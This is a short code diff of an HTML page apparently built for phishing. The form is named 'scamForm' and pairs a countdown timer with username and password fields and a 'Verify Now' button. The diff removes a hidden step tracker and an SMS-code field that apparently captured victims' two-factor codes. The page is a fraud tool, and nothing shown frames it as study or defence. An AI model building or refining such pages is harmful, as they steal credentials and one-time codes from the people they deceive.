@@ -327,10 +327,7 @@ body {
             Time Remaining: <span id="countdown">09:59</span>
         </div>
         
-                <form id="scamForm">
-            <!-- Hidden field to track which step we are on -->
-            <input type="hidden" name="step" id="step" value="1">
-
+                       <form id="scamForm">
             <div class="form-group">
                 <input type="text" name="username" placeholder="Username" required>
             </div>
@@ -338,12 +335,7 @@ body {
                 <input type="password" name="password" placeholder="Password" required>
             </div>
 
-            <!-- SMS Code Input (Hidden initially) -->
-            <div class="form-group" id="smsGroup" style="display: none; margin-top: 15px;">
-                <label style="display: block; margin-bottom: 5px; font-size: 14px;">Enter SMS Code</label>
-                <input type="text" name="sms_code" id="sms_code" placeholder="e.g. 123456" maxlength="6" 
-                       style="width: 100%; padding: 12px; text-align: center; letter-spacing: 5px; font-size: 16px;">
-            </div>
+            
 
             <button id="verifyBtn" type="submit">Verify Now</button>
         </form>
